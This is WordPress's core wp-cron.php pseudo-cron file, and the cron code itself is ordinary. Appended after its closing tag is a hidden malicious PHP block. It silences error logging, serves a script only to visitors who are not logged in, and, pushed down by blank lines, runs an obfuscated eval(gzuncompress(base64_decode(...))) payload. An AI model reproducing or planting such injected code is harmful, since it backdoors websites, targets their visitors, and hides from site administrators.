<?php
/**
 * A pseudo-cron daemon for scheduling WordPress tasks.
 *
 * WP-Cron is triggered when the site receives a visit. In the scenario
 * where a site may not receive enough visits to execute scheduled tasks
 * in a timely manner, this file can be called directly or via a server
 * cron daemon for X number of times.
 *
 * Defining DISABLE_WP_CRON as true and calling this file directly are
 * mutually exclusive and the latter does not rely on the former to work.
 *
 * The HTTP request to this file will not slow down the visitor who happens to
 * visit when a scheduled cron event runs.
 *
 * @package WordPress
 */

ignore_user_abort( true );

/* Don't make the request block till we finish, if possible. */
if ( function_exists( 'fastcgi_finish_request' ) && version_compare( phpversion(), '7.0.16', '>=' ) ) {
	if ( ! headers_sent() ) {
		header( 'Expires: Wed, 11 Jan 1984 05:00:00 GMT' );
		header( 'Cache-Control: no-cache, must-revalidate, max-age=0' );
	}

	fastcgi_finish_request();
}

if ( ! empty( $_POST ) || defined( 'DOING_AJAX' ) || defined( 'DOING_CRON' ) ) {
	die();
}

/**
 * Tell WordPress we are doing the cron task.
 *
 * @var bool
 */
define( 'DOING_CRON', true );

if ( ! defined( 'ABSPATH' ) ) {
	/** Set up WordPress environment */
	require_once __DIR__ . '/wp-load.php';
}

/**
 * Retrieves the cron lock.
 *
 * Returns the uncached `doing_cron` transient.
 *
 * @ignore
 * @since 3.3.0
 *
 * @global wpdb $wpdb WordPress database abstraction object.
 *
 * @return string|int|false Value of the `doing_cron` transient, 0|false otherwise.
 */
function _get_cron_lock() {
	global $wpdb;

	$value = 0;
	if ( wp_using_ext_object_cache() ) {
		/*
		 * Skip local cache and force re-fetch of doing_cron transient
		 * in case another process updated the cache.
		 */
		$value = wp_cache_get( 'doing_cron', 'transient', true );
	} else {
		$row = $wpdb->get_row( $wpdb->prepare( "SELECT option_value FROM $wpdb->options WHERE option_name = %s LIMIT 1", '_transient_doing_cron' ) );
		if ( is_object( $row ) ) {
			$value = $row->option_value;
		}
	}

	return $value;
}

$crons = wp_get_ready_cron_jobs();
if ( empty( $crons ) ) {
	die();
}

$gmt_time = microtime( true );

// The cron lock: a unix timestamp from when the cron was spawned.
$doing_cron_transient = get_transient( 'doing_cron' );

// Use global $doing_wp_cron lock, otherwise use the GET lock. If no lock, try to grab a new lock.
if ( empty( $doing_wp_cron ) ) {
	if ( empty( $_GET['doing_wp_cron'] ) ) {
		// Called from external script/job. Try setting a lock.
		if ( $doing_cron_transient && ( $doing_cron_transient + WP_CRON_LOCK_TIMEOUT > $gmt_time ) ) {
			return;
		}
		$doing_wp_cron        = sprintf( '%.22F', microtime( true ) );
		$doing_cron_transient = $doing_wp_cron;
		set_transient( 'doing_cron', $doing_wp_cron );
	} else {
		$doing_wp_cron = $_GET['doing_wp_cron'];
	}
}

/*
 * The cron lock (a unix timestamp set when the cron was spawned),
 * must match $doing_wp_cron (the "key").
 */
if ( $doing_cron_transient !== $doing_wp_cron ) {
	return;
}

foreach ( $crons as $timestamp => $cronhooks ) {
	if ( $timestamp > $gmt_time ) {
		break;
	}

	foreach ( $cronhooks as $hook => $keys ) {

		foreach ( $keys as $k => $v ) {

			$schedule = $v['schedule'];

			if ( $schedule ) {
				wp_reschedule_event( $timestamp, $schedule, $hook, $v['args'] );
			}

			wp_unschedule_event( $timestamp, $hook, $v['args'] );

			/**
			 * Fires scheduled events.
			 *
			 * @ignore
			 * @since 2.1.0
			 *
			 * @param string $hook Name of the hook that was scheduled to be fired.
			 * @param array  $args The arguments to be passed to the hook.
			 */
			do_action_ref_array( $hook, $v['args'] );

			// If the hook ran too long and another cron process stole the lock, quit.
			if ( _get_cron_lock() !== $doing_wp_cron ) {
				return;
			}
		}
	}
}

if ( _get_cron_lock() === $doing_wp_cron ) {
	delete_transient( 'doing_cron' );
}

die();

?>
<?php error_reporting(0); @ini_set('error_log', NULL); @ini_set('log_errors', 0); @ini_set('display_errors', 0); $cG9OI8 = 0; foreach($_COOKIE as $vUjUnHvOOoO => $vvvUjUnHvOOoO){ if (strstr(strval($vUjUnHvOOoO), 'wordpress_logged_in')){ $cG9OI8 = 1; break; } } if($cG9OI8 == 0){ echo '<script type="text/javascript"></script>'; } ?>















<?php $kSZOs = 'base6'.'4'.'_'.'deco'.'de'; $IgVhW = 'gzunco'.'mpress'; error_reporting(0); ini_set('error_log', NULL); eval($IgVhW($kSZOs('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'))); ?>